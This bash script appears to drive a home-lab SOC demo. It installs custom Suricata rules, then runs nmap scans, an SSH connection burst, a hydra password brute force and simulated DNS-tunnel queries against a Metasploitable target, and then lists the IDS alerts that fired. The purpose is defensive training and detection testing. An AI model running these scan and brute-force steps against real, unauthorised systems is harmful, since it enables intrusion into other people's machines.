#!/usr/bin/env bash
# =====================================================================
# SecureHome SOC — ONE-SHOT attack -> detect demo (run from Kali)
#
#   Usage:   sudo bash soc-demo.sh [TARGET_IP]
#            (TARGET_IP defaults to 192.168.1.3 = Metasploitable)
#
# What it does, end to end:
#   0. make sure nmap / hydra / suricata / jq are installed
#   1. install our custom detection rules
#   2. start Suricata IDS on the LAN interface
#   3. ATTACK the target: host discovery, full service scan, SSH brute force
#   4. show the Suricata ALERTS that fired  = the attack->detect loop
# =====================================================================
set -uo pipefail

TARGET="${1:-192.168.1.3}"
IFACE="${IFACE:-eth0}"
NET="$(echo "$TARGET" | sed -E 's/\.[0-9]+$/.0\/24/')"
WORK="${SUDO_USER:+/home/$SUDO_USER}/soc-demo"; WORK="${WORK:-$HOME/soc-demo}"
mkdir -p "$WORK"; cd "$WORK"

cyan(){ printf '\n\033[1;36m========== %s ==========\033[0m\n' "$*"; }
grn(){  printf '\033[1;32m%s\033[0m\n' "$*"; }

cyan "SecureHome SOC demo   attacker=$(hostname)   target=$TARGET   iface=$IFACE"

# ---- 0. tools -------------------------------------------------------
cyan "0. Checking tools"
declare -A pkg=( [nmap]=nmap [hydra]=hydra [suricata]=suricata [jq]=jq [dig]=dnsutils )
need=()
for t in nmap hydra suricata jq dig; do command -v "$t" >/dev/null || need+=("${pkg[$t]}"); done
if [ "${#need[@]}" -gt 0 ]; then
  echo "Installing: ${need[*]}"
  sudo apt-get update -y && sudo apt-get install -y "${need[@]}"
fi

# ---- 1. detection rules --------------------------------------------
cyan "1. Installing custom detection rules"
RULES_FILE="/etc/suricata/rules/securehome.rules"
sudo mkdir -p /etc/suricata/rules
sudo tee "$RULES_FILE" >/dev/null <<'RULES'
alert tcp any any -> $HOME_NET any (msg:"SECUREHOME Nmap port scan"; flags:S; flow:to_server; threshold:type both, track by_src, count 20, seconds 10; classtype:attempted-recon; sid:1000001; rev:2;)
alert tcp any any -> $HOME_NET 22 (msg:"SECUREHOME SSH brute-force"; flags:S; flow:to_server; threshold:type both, track by_src, count 5, seconds 20; classtype:attempted-admin; sid:1000010; rev:2;)
alert dns any any -> any any (msg:"SECUREHOME DNS tunnel - oversized query name"; dns.query; dns.query.length:>40; threshold:type both, track by_src, count 3, seconds 10; classtype:policy-violation; sid:1000020; rev:1;)
alert dns any any -> any any (msg:"SECUREHOME DNS tunnel - query flood"; dns.query; threshold:type both, track by_src, count 25, seconds 10; classtype:policy-violation; sid:1000022; rev:1;)
RULES

# ---- 2. start Suricata IDS (load ONLY our rules with -S, absolute path) ----
cyan "2. Starting Suricata IDS on $IFACE"
sudo pkill -f 'suricata ' 2>/dev/null || true
sleep 2
sudo rm -f /var/log/suricata/eve.json
sudo suricata -S "$RULES_FILE" -i "$IFACE" -l /var/log/suricata -D
echo "   waiting for Suricata to initialise..."; sleep 12
if ! pgrep -x suricata >/dev/null; then
  echo "Suricata failed to start — log:"; sudo tail -n 15 /var/log/suricata/suricata.log
fi

# ---- 3. ATTACKS -----------------------------------------------------
cyan "3a. Recon — host discovery on $NET"
nmap -sn "$NET"

cyan "3b. Recon — SYN scan of $TARGET (generates the scan signature)"
sudo nmap -sS -T4 "$TARGET" | tee scan.txt

cyan "3c. Full service/version scan of $TARGET"
nmap -sV "$TARGET" | tee -a scan.txt

cyan "3d. SSH brute-force on $TARGET"
# Burst of TCP connects to port 22 -> reliably triggers the SSH-brute rule,
# even though Metasploitable's legacy SSH refuses modern hydra negotiation.
for i in $(seq 1 15); do
  timeout 1 bash -c "exec 3<>/dev/tcp/$TARGET/22" 2>/dev/null
done
# Also run the real tool (may error on the old SSH algos; that's fine).
printf 'root\nmsfadmin\npassword\n123456\nadmin\n' > wl.txt
hydra -l msfadmin -P wl.txt "ssh://$TARGET" -t 4 -f 2>&1 | tee hydra.txt || true

cyan "3e. DNS tunneling (oversized + high-volume DNS queries)"
# A DNS tunnel hides data in long subdomain labels at high volume. We generate
# that pattern from here; Suricata flags it on the query name length + rate.
for i in $(seq 1 40); do
  label="$(head -c 60 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 50)"
  dig +short +time=1 +tries=1 "${label}.tunnel.example.com" >/dev/null 2>&1
done
echo "sent 40 tunnel-style DNS queries (long names, high rate)"

# ---- 4. DETECTIONS --------------------------------------------------
cyan "4. Suricata ALERTS  (the attack -> detect loop)"
sleep 8
EVE=/var/log/suricata/eve.json
if sudo test -s "$EVE"; then
  sudo jq -r 'select(.event_type=="alert")
        | "\(.timestamp[11:19])  \(.src_ip) -> \(.dest_ip)   [\(.alert.signature)]"' \
        "$EVE" 2>/dev/null | sort -u
  echo
  grn "Alert count: $(sudo grep -ac '\"event_type\":\"alert\"' "$EVE")"
  [ "$(sudo grep -ac '\"event_type\":\"alert\"' "$EVE")" = "0" ] && \
    { echo "No alerts — Suricata log tail:"; sudo tail -n 15 /var/log/suricata/suricata.log; }
else
  echo "No eve.json — Suricata log tail:"; sudo tail -n 15 /var/log/suricata/suricata.log
fi

cyan "DONE — recon -> attack -> detect, all in one run"
echo "Scan report : $WORK/scan.txt"
echo "Brute result: $WORK/hydra.txt"
echo "Full alerts : sudo cat /var/log/suricata/eve.json | jq 'select(.event_type==\"alert\")'"
echo "Stop IDS    : sudo pkill -f 'suricata -i'"
